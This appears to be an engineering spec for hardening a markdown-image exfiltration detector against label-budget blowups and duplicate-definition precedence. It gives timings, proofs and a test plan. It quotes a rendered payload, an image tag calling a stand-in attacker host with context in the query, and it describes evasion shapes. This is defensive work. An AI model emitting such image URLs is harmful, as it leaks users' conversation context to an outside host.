# T81 — spec: close T78#F-001 (attacker-chosen label budget) and T78#F-002 (duplicate definition precedence)

Scope, verbatim from the dispatch: the two blockers T78 reproduced at a public boundary, and nothing
else. Files I may touch: `src/security/detect/exfil.ts`, `src/security/detect/exfil.test.ts`, and the
auto-fetch subsection of `docs/requirements/keryx-agent-first-core/policies.md` **only if** my change
makes its current wording untrue.

## Baseline, measured before any edit (my machine, this tree)

Probes run unmodified: `T78-perf.ts`, `T78-dup.ts`, `T78-boundary.ts`.
Raw: `.metaproject/data/gdctx/raw/T81-before-T78-{perf,dup,boundary}.log`.

| Shape | bytes | ms | exponent |
|---|---|---|---|
| `balancedNest_noDef` (control) | 200 000 | 43.4 | 0.85 |
| `balancedNest_withLongDef` | 400 029 | **20 802.7** | **1.79** |
| `openRunOneClose_withLongDef` | 300 030 | **7 240.0** | **2.11** |
| `bangOpenRunOneClose_withLongDef` | 300 030 | **4 561.8** | **1.78** |
| `openRunOneClose_shortDef` (budget 4) | 100 034 | 18.8 | 1.06 |

Boundaries on one 128 029-byte payload: `dispatchCallTool` 1 948.1 ms,
`prepareOutputForPersistence` 1 958.3 ms, `validateOutputForTransport` 2 278.0 ms,
`redactToolOutput` 1 989.5 ms — **all four over a second**. Ladder 8 KB = 10.9 ms → 256 KB = 8 368.6 ms.

`T78-dup`: `leakingCount: 6`, every row `mcpState: "redacted"` with the attacker host present at all
four boundaries; the control `c1SingleDef` closed. `marked` emits
`<img src="https://attacker.invalid/p?ctx=CTX">` for all six, i.e. the renderer fetches the **first**
definition while the detector masks the **last**.

Both findings reproduce. Everything else in T78's verdict table reproduces as PASS and is not re-opened.

## Finding 1 — the property the bound must have

**What is wrong.** `LabelBudget.maxLength` is the longest key *this document's own* `[ref]: URL` lines
produced. It is read out of the attacker's payload, so it is not a bound on anything: one long
definition line raises it arbitrarily and every opening bracket is then sliced, whitespace-collapsed
and lowercased at O(span). This is the third attempt at a bound on this path (T71's constant 999,
T77's derived maximum), so the acceptance test is not "is this bound larger" but:

> **P — no quantity the document can write changes the asymptotic cost. Total label work is
> Θ(content.length): the only thing an attacker can inflate is the input's own size.**

**Why neither of the two obvious repairs satisfies P.** Restoring a constant reopens T72#F-002 (a
1200-character label is resolved and fetched by `marked`; the constant released it). Keeping a bound
derived from the definitions keeps a number the payload writes. So the bound must be on **total work**,
and the filters that keep the work low must be derived from quantities the document *cannot* write.

**The formulation I will implement**, three parts, in the order they bite:

1. **Move the `!` gate before the work (structural, not a bound).** The inline pass calls
   `readBracketConstructs` and then reads only `kind === "inline"`, discarding every reference
   construct it paid to build; the reference pass discards them too for every non-`!` open, and its
   `!` test sits at `:1335`, *after* the constructs are built. `readBracketConstructs` gains a
   `wantReference` parameter: `false` in the inline pass always, `isImage` in the reference pass. This
   is behaviour-preserving by construction — the constructs removed are exactly the ones both callers
   already threw away — and it means only an `![` open can ever cost a label slice.
2. **Two necessary conditions the document cannot inflate.** A key is `m[1]` of
   `REFERENCE_DEF = /^[ \t]*\[([^\]]+)\]:…/gm`, whose capture is `[^\]]+`. So **no key can ever contain
   `]`**, whatever the attacker writes, and `normaliseLabel` (trim / collapse whitespace runs /
   lowercase) neither adds nor removes a `]`. Therefore *a span containing `]` cannot equal any key* —
   a necessary condition with a structural guarantee behind it, not a measured one. The same argument
   for `[` gives a condition that is *derived* (the most `[` any key carries, normally 0), so it is
   used only as a filter, never as the bound.
   Consequence, and this is the part that makes the cost linear rather than merely smaller: after
   condition (2) a candidate span is bracket-free, so the `[` that opens it is the last `[` before the
   `]` that closes it, and two bracket-free spans cannot share either endpoint. The spans are pairwise
   **disjoint**, so their total length is at most `content.length`. That is a proof, not a measurement.
3. **A total-work budget as the backstop, whose failure direction is a finding.** The one case (2)
   leaves open is a document that defines a label *containing* `[`, which raises the `[` filter's
   threshold. Against that, `LabelBudget` carries `work = LABEL_WORK_FACTOR * content.length`
   characters of label normalisation, decremented by each span actually sliced. When it runs out the
   label path stops slicing **and every reference definition in the document is flagged** — over-
   approximation, never release. `LABEL_WORK_FACTOR = 8` is not a bound on any length: it is a
   multiplier on the input's own size, so total work stays Θ(n) for every document, and 8× is roughly
   four times the most an honest document can spend (at most two candidate spans per `![` open, and
   the spans of a well-formed document are disjoint).

**Why an attacker cannot inflate it.** Every term is either the input length itself (part 3), or a
quantity with a structural guarantee independent of the payload (part 2's `]` rule), or a filter that
can only *reduce* work below the part-3 ceiling (part 2's `[` rule, and the existing `maxLength`
condition, which I keep because it is sound and cheap but no longer rely on). There is no path where
writing more of something buys more than linear work.

**Demonstration.** Not an assertion: (a) T78's own three shapes re-measured; (b) definition-carrying
variants of every shape in the existing perf test; (c) shapes I construct specifically against each
part — one that defeats part 1 (`![` opens), one that defeats part 2 (a definition whose label
contains a long run of `[`, which is the only way to raise the `[` filter), one that defeats the
`maxLength` filter by whitespace inflation, and one prose-shaped; (d) a ladder that shows the growth
exponent at ~1.0 rather than ~2.0; (e) the four public boundaries.

## Finding 2 — duplicate definition precedence

CommonMark: *"If there are several matching definitions, the first one takes precedence."* `refs` is a
`Map` written with `set`, so the last wins, the finding masks the last definition's URL, and the
renderer fetches the first — measured: six spellings, all four boundaries, `state:"redacted"`.

I will **not** implement the minimal first-wins swap alone. The reviewer offers it and it is correct
for CommonMark, but this module's recurring defect across nine rounds is *a layer judging text in a
form the renderer does not use* — and first-wins is again a bet on one renderer's precedence rule. The
table's value becomes a **list**, and every definition of a label an image use resolves is flagged.
That subsumes first-wins (the first definition is always among them), so it is correct under CommonMark
*and* under any renderer with the opposite precedence, and its cost is one extra masked URL in a
document with an accidental duplicate. If the benign corpus grows because of it I will say so with the
file and the vector; if the growth is a real duplicate in an ordinary document I will fall back to
first-wins and record why.

`maxLabelLength` is unaffected either way: duplicates share a normalised key, hence a length.

## Tests (RED first)

In `src/security/detect/exfil.test.ts`, each written to fail on the current tree:

- `T81#F-002`: the six `T78-dup` spellings — detector, `applyRedaction`, `prepareOutputForPersistence`
  and `validateOutputForTransport` — assert the attacker host is gone and the control keeps working.
- `T81#F-001`: a perf test mirroring the existing `T77#F-003` one, every shape carrying a definition,
  plus the three T78 shapes and the two part-defeating shapes, under the same 500 ms budget.
- `T81#F-001` (budget direction): a document that exhausts the work budget must **flag** its
  definition, not release it.
- Non-regression: the label classes T77 closed (1200-character labels, whitespace-differing labels,
  all three reference spellings, the badge idiom) must stay closed — these already exist and must stay
  green.

## Verification to report

Three reviewer probes before/after; all prior matrices before/after by hash (T42-exfil-attack,
T24-recheck2-exfil, T42-charrefs, T53-extract, T53-resolve, T53-base, T53-boundary, T42-boundary,
T24-recheck2-boundary, T52-base, T46-surfaces, T72-md, T72-gates, T72-srcset, T72-doc, T77-doc);
a performance table over the adversarial shapes; the benign corpus count; the four focused suites;
`bun run typecheck`; `bunx eslint` on every changed file.
